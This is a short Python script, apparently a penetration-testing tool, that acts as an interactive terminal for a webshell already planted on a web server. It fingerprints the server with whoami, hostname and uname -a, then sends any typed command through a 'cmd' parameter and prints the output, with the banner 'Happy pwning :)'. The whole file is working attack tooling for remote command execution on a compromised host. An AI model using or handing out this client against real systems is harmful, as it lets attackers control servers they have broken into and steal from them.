import requests 
import argparse
import time

def parseArgs():
  parser = argparse.ArgumentParser(
    prog = 'Simple Webshell',
    description = 'Emulate a simple terminal interface for an uploaded webshell'
  )
  
  parser.add_argument('url')
  parser.add_argument('-m', '--method', default='GET',
                      help='HTTP method to use (default: GET)')
  parser.add_argument('-os', '--os', choices=['linux', 'windows'], default='linux',
                      help='Operating system of webserver (default: linux)')
  
  args = parser.parse_args()
  
  return args

def sendCommand(url, method, command):
  try:
    params = {"cmd": command}
    
    if method.upper() == "GET":
      response = requests.get(url, params=params)
    
    elif method.upper() == "POST":
      response = requests.post(url, params=params)
    
    else:
      return "Invalid request method. Use GET or POST."

    response.raise_for_status()
    
    return response.text
  
  except requests.exceptions.RequestException as e:
    return f"Error communicating with the webshell: {e}"

def initConnection(os, method, url): 
  if os == 'linux':
    commands = ["whoami", "hostname", "uname -a"]
  
  if os == 'windows':
    commands = ["whoami", "hostname", "uname -a"]
  
  responses = []
  totalTime = 0
  
  for command in commands:
    
    startTime = time.time()
    response = sendCommand(url, method, command); endTime = time.time()
    responses.append(response)
    
    responseTime = endTime - startTime
    totalTime += responseTime
  
  latency = totalTime / 3
  return responses[0], responses[1], responses[2], latency
  
def main():
  args = parseArgs()
  url = args.url
  method = args.method
  os = args.os
  
  print("Simple Webshell")
  
  username, hostname, serverInfo, latency = initConnection(os, method, url)
  
  serverInfo = serverInfo.strip()
  username = username.strip()
  hostname = hostname.strip()
  
  GREEN = "\033[32m"
  BLUE = "\033[34m"
  RESET = "\033[0m"
  
  print(f"Latency is ~{latency:.4f}s")
  print(f"OS Version: {serverInfo}")
  print("Happy pwning :)")
  print("Type 'exit' to quit\n")
  
  while True:
    command = input(f"{GREEN}{username}{RESET}@{BLUE}{hostname}{RESET} λ ")
    
    if command.lower() == 'exit':
      print("Exiting, goodluck.")
      break
    
    output = sendCommand(url, method, command)
    print(output.strip())

if __name__ == "__main__":
  main()